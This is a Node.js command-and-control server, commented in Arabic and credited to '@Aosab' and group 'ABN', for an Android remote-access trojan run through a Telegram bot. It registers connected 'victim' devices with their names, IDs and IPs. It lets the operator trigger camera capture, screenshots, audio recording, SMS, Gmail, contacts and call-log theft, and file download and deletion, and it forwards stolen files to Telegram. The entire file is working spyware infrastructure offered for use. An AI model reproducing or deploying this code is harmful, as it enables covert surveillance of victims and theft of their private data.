// server.js - بوت تحكم عن بعد
// تم تطوير هذا البوت من قبل @Aosab
// تم انشاء هذا البوت من قبل منظمة 『ABN』

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

// تحميل البيانات من ملف JSON
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// تهيئة التطبيق
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// تهيئة بوت التليجرام
const bot = new TelegramBot(data.token, { polling: true });

// تخزين البيانات
const appData = new Map();

// قائمة الإجراءات
const actions = [
    '📸 كيمرا خلفيه 📸',
    '📸 كيمرا أماميه 📸',
    '📺 لقطة شاشة 😎',
    '🎬 سحب جميع الصور 🎬',
    '📂 عرض جميع الملفات 📂',
    '📧 سحب رسايل جيميل 📧',
    '💬 سحب الرسايل 💬',
    '📒 سحب جهات الاتصال 📒',
    '📞 سجل المكالمات 📞',
    '📋 سجل الحافظة 📋',
    '📳 اهتزاز 📳',
    '🛑 ايقاف الاهتزاز 🛑',
    '🎙 تسجيل صوت 🎙',
    '▶ تشغيل الصوت ▶',
    '🛑 ايقاف الصوت 🛑',
    '✯ عدد الاجهزة ✯',
    '✯ معلومات الجهاز ✯',
    '✯ تحميل ملف ✯',
    '✯ حذف الملف ✯',
    '✯ تحديث قائمة الملفات ✯',
    '✯ العودة إلى القائمة الرئيسية ✯'
];

// صفحة الويب الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Remote Control Bot</title>
            <meta charset="UTF-8">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    padding: 50px;
                    background-color: #f0f0f0;
                }
                .container {
                    background-color: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    max-width: 600px;
                    margin: 0 auto;
                }
                h1 {
                    color: #333;
                }
                .organization {
                    background-color: #ffebee;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 20px 0;
                    border-left: 4px solid #d32f2f;
                }
                .developer {
                    background-color: #e8f5e8;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 20px 0;
                    border-left: 4px solid #388e3c;
                }
                .footer {
                    margin-top: 30px;
                    color: #666;
                    font-size: 14px;
                }
                .credits {
                    background-color: #f5f5f5;
                    padding: 10px;
                    border-radius: 5px;
                    margin-top: 20px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 Remote Control Bot</h1>
                
                <div class="organization">
                    <strong>🏢 المنظمة المنشئة:</strong> منظمة 『ABN』
                </div>
                
                <div class="developer">
                    <strong>👨‍💻 المطور:</strong> @Aosab
                </div>
                
                <div class="credits">
                    <p>✅ تم تطوير هذا البوت من قبل @Aosab</p>
                    <p>✅ تم انشاء هذا البوت من قبل منظمة 『ABN』</p>
                </div>
                
                <p>Bot is running and ready to receive connections...</p>
                
                <div class="footer">
                    <p>📡 Server Status: <span style="color: green;">Online</span></p>
                    <p>⏰ Time: ${new Date().toLocaleString()}</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// رفع الملفات
app.post('/upload', uploader.single('file'), (req, res) => {
    try {
        const fileName = req.file.originalname;
        const victimName = req.body.victim;
        
        bot.sendDocument(data.id, req.file.buffer, {
            caption: `📁 تم رفع ملف\n👤 من الضحية: ${victimName}\n📄 اسم الملف: ${fileName}\n\n🏢 المنظمة: 『ABN』\n👨‍💻 المطور: @Aosab`,
            parse_mode: 'HTML'
        }, {
            filename: fileName,
            contentType: 'application/octet-stream'
        });
        
        res.send('Done');
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Error uploading file');
    }
});

// معالجة اتصال سوكيت جديد
io.on('connection', (socket) => {
    console.log('🔗 New device connected:', socket.id);
    console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    
    const victimName = socket.handshake.query.name || 'غير معروف';
    const deviceId = socket.handshake.query.deviceId || socket.id;
    const ip = socket.handshake.query.ip || 'غير معروف';
    
    socket.victimName = victimName;
    socket.deviceId = deviceId;
    
    // إرسال إشعار بالاتصال الجديد
    const connectionMessage = `
🔔 **جهاز جديد متصل** 🔔
👤 **الاسم:** ${victimName}
📱 **الرقم:** ${deviceId}
🌐 **الآي بي:** ${ip}
🆔 **معرف الاتصال:** ${socket.id}

🏢 **المنظمة:** 『ABN』
👨‍💻 **المطور:** @Aosab

📌 *تم انشاء هذا البوت من قبل منظمة 『ABN』*
    `;
    
    bot.sendMessage(data.id, connectionMessage, { parse_mode: 'Markdown' });
    
    // معالجة قطع الاتصال
    socket.on('disconnect', () => {
        console.log('🔴 Device disconnected:', socket.id);
        console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
        
        const disconnectMessage = `
🔴 **جهاز انقطع** 🔴
👤 **الاسم:** ${victimName}
📱 **الرقم:** ${deviceId}
🌐 **الآي بي:** ${ip}
🆔 **معرف الاتصال:** ${socket.id}

🏢 **المنظمة:** 『ABN』
👨‍💻 **المطور:** @Aosab

📌 *تم انشاء هذا البوت من قبل منظمة 『ABN』*
        `;
        
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'Markdown' });
    });
    
    // استقبال قائمة الملفات
    socket.on('file-list', (files) => {
        try {
            let keyboard = [];
            let row = [];
            
            files.forEach((file, index) => {
                let callbackData;
                if (file.isFolder) {
                    callbackData = `${deviceId}|cd|${file.name}`;
                } else {
                    callbackData = `${deviceId}|download|${file.name}`;
                }
                
                row.push({
                    text: file.name,
                    callback_data: callbackData
                });
                
                if (row.length === 2 || index === files.length - 1) {
                    keyboard.push(row);
                    row = [];
                }
            });
            
            keyboard.push([{
                text: '✯ رجوع ✯',
                callback_data: `${deviceId}|back`
            }]);
            
            bot.sendMessage(data.id, 
                `📁 **ملفات الضحية:** ${victimName}\n👇 اختر الملف الذي تريد:\n\n` +
                `🏢 *تم انشاء هذا البوت من قبل منظمة 『ABN』*\n` +
                `👨‍💻 *تم تطوير هذا البوت من قبل @Aosab*`, {
                reply_markup: { inline_keyboard: keyboard },
                parse_mode: 'Markdown'
            });
        } catch (error) {
            console.error('File list error:', error);
        }
    });
    
    // استقبال الرسائل من الجهاز
    socket.on('message', (message) => {
        bot.sendMessage(data.id, 
            `📩 **رسالة من ${victimName}:**\n\n${message}\n\n` +
            `🏢 المنظمة: 『ABN』\n` +
            `👨‍💻 المطور: @Aosab\n\n` +
            `📌 تم انشاء هذا البوت من قبل منظمة 『ABN』`, { 
            parse_mode: 'Markdown' 
        });
    });
    
    // استقبال أوامر أخرى
    socket.on('command-response', (response) => {
        bot.sendMessage(data.id, 
            `📊 **رد على الأمر:**\n\n${response}\n\n` +
            `🏢 **معلومات البوت:**\n` +
            `• المنشئ: منظمة 『ABN』\n` +
            `• المطور: @Aosab`, { 
            parse_mode: 'Markdown' 
        });
    });
});

// معالجة رسائل التليجرام
bot.on('message', (msg) => {
    try {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        // أمر البدء
        if (text === '/start') {
            const welcomeMessage = `
🤖 **مرحباً بك في بوت التحكم** 🤖

✅ *المميزات:*
- التحكم الكامل في الأجهزة
- إرسال رسائل SMS
- التقاط لقطات الشاشة
- الوصول إلى الملفات
- تشغيل الكاميرا والميكروفون
- وغيرها الكثير...

👇 *الأوامر الرئيسية:*
🔍 **عرض الأجهزة** - لعرض جميع الأجهزة المتصلة
📱 **اختر جهاز** - لاختيار جهاز للتحكم
🔙 **رجوع** - للعودة للقائمة الرئيسية

🏢 **المنظمة:** 『ABN』
👨‍💻 **المطور:** @Aosab

📌 *تم انشاء هذا البوت من قبل منظمة 『ABN』*
🎯 *تم تطوير هذا البوت من قبل @Aosab*
            `;
            
            bot.sendMessage(chatId, welcomeMessage, {
                parse_mode: 'Markdown',
                reply_markup: {
                    keyboard: [
                        ['🔍 عرض الأجهزة', '📱 اختر جهاز'],
                        ['🔙 رجوع']
                    ],
                    resize_keyboard: true
                }
            });
            return;
        }
        
        // عرض الأجهزة المتصلة
        if (text === '🔍 عرض الأجهزة') {
            const connectedDevices = Array.from(io.sockets.sockets.values());
            
            if (connectedDevices.length === 0) {
                bot.sendMessage(chatId, 
                    '⚠️ لا توجد أجهزة متصلة حالياً.\n\n' +
                    '🏢 **معلومات البوت:**\n' +
                    '• المنشئ: منظمة 『ABN』\n' +
                    '• المطور: @Aosab\n\n' +
                    '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』', {
                    parse_mode: 'Markdown'
                });
            } else {
                let devicesList = `📱 **الأجهزة المتصلة (${connectedDevices.length}):**\n\n`;
                let counter = 1;
                
                connectedDevices.forEach((socket) => {
                    devicesList += `**${counter}.** 👤 ${socket.victimName || 'غير معروف'}\n`;
                    devicesList += `   📱 ${socket.deviceId || socket.id}\n`;
                    devicesList += `   🌐 ${socket.handshake.query.ip || 'غير معروف'}\n\n`;
                    counter++;
                });
                
                devicesList += `🏢 *تم انشاء هذا البوت من قبل منظمة 『ABN』*\n`;
                devicesList += `👨‍💻 *تم تطوير هذا البوت من قبل @Aosab*`;
                
                bot.sendMessage(chatId, devicesList, {
                    parse_mode: 'Markdown'
                });
            }
            return;
        }
        
        // اختر جهاز
        if (text === '📱 اختر جهاز') {
            const connectedDevices = Array.from(io.sockets.sockets.values());
            
            if (connectedDevices.length === 0) {
                bot.sendMessage(chatId, 
                    '⚠️ لا توجد أجهزة متصلة حالياً.\n\n' +
                    '🏢 المنظمة: 『ABN』\n' +
                    '👨‍💻 المطور: @Aosab\n\n' +
                    '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』', {
                    parse_mode: 'Markdown'
                });
            } else {
                let deviceButtons = [];
                
                connectedDevices.forEach((socket) => {
                    deviceButtons.push([`${socket.victimName || 'جهاز'} - ${socket.deviceId || socket.id}`]);
                });
                
                deviceButtons.push(['🔙 رجوع']);
                
                bot.sendMessage(chatId, 
                    '👇 اختر الجهاز الذي تريد التحكم به:\n\n' +
                    '🏢 **معلومات:**\n' +
                    '• المنشئ: منظمة 『ABN』\n' +
                    '• المطور: @Aosab\n\n' +
                    '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』', {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: deviceButtons,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
            return;
        }
        
        // رجوع
        if (text === '🔙 رجوع') {
            bot.sendMessage(chatId, 
                '🔙 **تم العودة للقائمة الرئيسية**\n\n' +
                '🏢 المنظمة: 『ABN』\n' +
                '👨‍💻 المطور: @Aosab\n\n' +
                '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』', {
                parse_mode: 'Markdown',
                reply_markup: {
                    keyboard: [
                        ['🔍 عرض الأجهزة', '📱 اختر جهاز'],
                        ['🔙 رجوع']
                    ],
                    resize_keyboard: true
                }
            });
            return;
        }
        
        // التحقق إذا كان النص هو اسم جهاز
        io.sockets.sockets.forEach((socket, socketId) => {
            const deviceName = `${socket.victimName || 'جهاز'} - ${socket.deviceId || socket.id}`;
            if (text === deviceName) {
                appData.set('currentDevice', socketId);
                
                const deviceControlMessage = `
🎯 **التحكم في الجهاز:** ${socket.victimName || 'غير معروف'}
📱 **الرقم:** ${socket.deviceId || socket.id}
🌐 **الآي بي:** ${socket.handshake.query.ip || 'غير معروف'}

👇 *الأوامر المتاحة:*

📸 **الكاميرا:**
- 📸 كيمرا خلفيه 📸
- 📸 كيمرا أماميه 📸

📱 **الجهاز:**
- 📺 لقطة شاشة 😎
- 📳 اهتزاز 📳
- 🛑 ايقاف الاهتزاز 🛑

🗂 **الملفات:**
- 📂 عرض جميع الملفات 📂
- ✯ تحميل ملف ✯
- ✯ حذف الملف ✯

📞 **الاتصالات:**
- 📒 سحب جهات الاتصال 📒
- 📞 سجل المكالمات 📞

💬 **الرسائل:**
- 💬 سحب الرسايل 💬
- 📧 سحب رسايل جيميل 📧

🎙 **الصوت:**
- 🎙 تسجيل صوت 🎙
- ▶ تشغيل الصوت ▶
- 🛑 ايقاف الصوت 🛑

🔧 **معلومات:**
- ✯ معلومات الجهاز ✯
- ✯ عدد الاجهزة ✯

🏢 **المنظمة:** 『ABN』
👨‍💻 **المطور:** @Aosab

📌 *تم انشاء هذا البوت من قبل منظمة 『ABN』*
                `;
                
                bot.sendMessage(chatId, deviceControlMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            ['📸 كيمرا خلفيه 📸', '📸 كيمرا أماميه 📸'],
                            ['📺 لقطة شاشة 😎', '📳 اهتزاز 📳'],
                            ['📂 عرض جميع الملفات 📂', '✯ تحميل ملف ✯'],
                            ['💬 سحب الرسايل 💬', '📧 سحب رسايل جيميل 📧'],
                            ['📒 سحب جهات الاتصال 📒', '📞 سجل المكالمات 📞'],
                            ['🎙 تسجيل صوت 🎙', '▶ تشغيل الصوت ▶'],
                            ['✯ معلومات الجهاز ✯', '✯ عدد الاجهزة ✯'],
                            ['🔙 رجوع']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        });
        
        // التحقق إذا كان النص هو أمر من قائمة الإجراءات
        if (actions.includes(text)) {
            const currentDevice = appData.get('currentDevice');
            
            if (!currentDevice) {
                bot.sendMessage(chatId, 
                    '⚠️ يرجى اختيار جهاز أولاً.\n\n' +
                    '🏢 **معلومات:**\n' +
                    '• المنشئ: منظمة 『ABN』\n' +
                    '• المطور: @Aosab\n\n' +
                    '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』', {
                    parse_mode: 'Markdown'
                });
                return;
            }
            
            // تنفيذ الأوامر المختلفة
            let command = '';
            
            switch(text) {
                case '📸 كيمرا خلفيه 📸':
                    command = 'selfie-cam';
                    break;
                case '📸 كيمرا أماميه 📸':
                    command = 'main-camera';
                    break;
                case '📺 لقطة شاشة 😎':
                    command = 'screenshot';
                    break;
                case '📳 اهتزاز 📳':
                    command = 'vibrate';
                    break;
                case '📂 عرض جميع الملفات 📂':
                    command = 'file-explorer';
                    break;
                case '💬 سحب الرسايل 💬':
                    command = 'all-sms';
                    break;
                // ... بقية الأوامر
            }
            
            if (command) {
                io.to(currentDevice).emit('command', {
                    request: command,
                    extras: []
                });
                
                // إضافة معلومات المنظمة والمطور في الرد
                bot.sendMessage(chatId, 
                    `✅ تم تنفيذ الأمر: **${text}**\n\n` +
                    `🏢 **معلومات البوت:**\n` +
                    `• تم انشاء هذا البوت من قبل منظمة 『ABN』\n` +
                    `• تم تطوير هذا البوت من قبل @Aosab`, {
                    parse_mode: 'Markdown'
                });
            }
        }
        
    } catch (error) {
        console.error('Bot message error:', error);
        bot.sendMessage(msg.chat.id, 
            '❌ حدث خطأ في معالجة الأمر. يرجى المحاولة مرة أخرى.\n\n' +
            '🏢 المنظمة: 『ABN』\n' +
            '👨‍💻 المطور: @Aosab\n\n' +
            '📌 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    }
});

// معالجة استدعاءات الرد (callback queries)
bot.on('callback_query', (callbackQuery) => {
    try {
        const data = callbackQuery.data;
        const parts = data.split('|');
        const deviceId = parts[0];
        const action = parts[1];
        const parameter = parts[2];
        
        // معالجة الأوامر المختلفة
        switch(action) {
            case 'back':
                bot.answerCallbackQuery(callbackQuery.id, { text: '↩️ العودة' });
                break;
            case 'cd':
                io.to(deviceId).emit('command', {
                    request: 'cd',
                    extras: [{ key: 'path', value: parameter }]
                });
                bot.answerCallbackQuery(callbackQuery.id, { text: '📁 جاري فتح المجلد...' });
                break;
            case 'download':
                io.to(deviceId).emit('command', {
                    request: 'download',
                    extras: [{ key: 'file', value: parameter }]
                });
                bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ جاري تحميل الملف...' });
                break;
            case 'delete':
                io.to(deviceId).emit('command', {
                    request: 'delete',
                    extras: [{ key: 'file', value: parameter }]
                });
                bot.answerCallbackQuery(callbackQuery.id, { text: '🗑️ جاري حذف الملف...' });
                break;
            default:
                bot.answerCallbackQuery(callbackQuery.id, { text: '⚙️ جاري المعالجة...' });
                break;
        }
        
        // إضافة رد يحتوي على معلومات المنظمة والمطور
        setTimeout(() => {
            bot.sendMessage(callbackQuery.message.chat.id, 
                `🏢 **معلومات البوت:**\n` +
                `• تم انشاء هذا البوت من قبل منظمة 『ABN』\n` +
                `• تم تطوير هذا البوت من قبل @Aosab\n\n` +
                `📊 **تفاصيل العملية:**\n` +
                `🆔 الجهاز: ${deviceId}\n` +
                `📋 الإجراء: ${action}\n` +
                `📁 المعامل: ${parameter || 'لا يوجد'}`);
        }, 1000);
        
    } catch (error) {
        console.error('Callback query error:', error);
        bot.answerCallbackQuery(callbackQuery.id, { 
            text: '❌ خطأ في المعالجة',
            show_alert: true 
        });
    }
});

// إرسال بينج للأجهزة كل 30 ثانية
setInterval(() => {
    io.sockets.sockets.forEach((socket) => {
        socket.emit('ping', { 
            message: '🏓 Ping from server',
            organization: 'منظمة 『ABN』',
            developer: '@Aosab',
            created_by: 'تم انشاء هذا البوت من قبل منظمة 『ABN』',
            timestamp: new Date().toISOString()
        });
    });
}, 30000);

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('='.repeat(60));
    console.log('✅ Server is running on port', PORT);
    console.log('🤖 Bot is active and ready');
    console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    console.log('👨‍💻 تم تطوير هذا البوت من قبل @Aosab');
    console.log('📌 Organization: منظمة 『ABN』');
    console.log('👤 Developer: @Aosab');
    console.log('='.repeat(60));
});

// معالجة الأخطاء الغير معالجة
process.on('uncaughtException', (error) => {
    console.error('🔥 Uncaught Exception:', error);
    console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    console.log('👨‍💻 تم تطوير هذا البوت من قبل @Aosab');
});

process.on('unhandledRejection', (error) => {
    console.error('🔥 Unhandled Rejection:', error);
    console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    console.log('👨‍💻 تم تطوير هذا البوت من قبل @Aosab');
});

// معلومات إضافية عند الإغلاق
process.on('SIGINT', () => {
    console.log('\n🛑 إغلاق الخادم...');
    console.log('🏢 تم انشاء هذا البوت من قبل منظمة 『ABN』');
    console.log('👨‍💻 تم تطوير هذا البوت من قبل @Aosab');
    console.log('👋 تم إنهاء الخادم بنجاح');
    process.exit(0);
});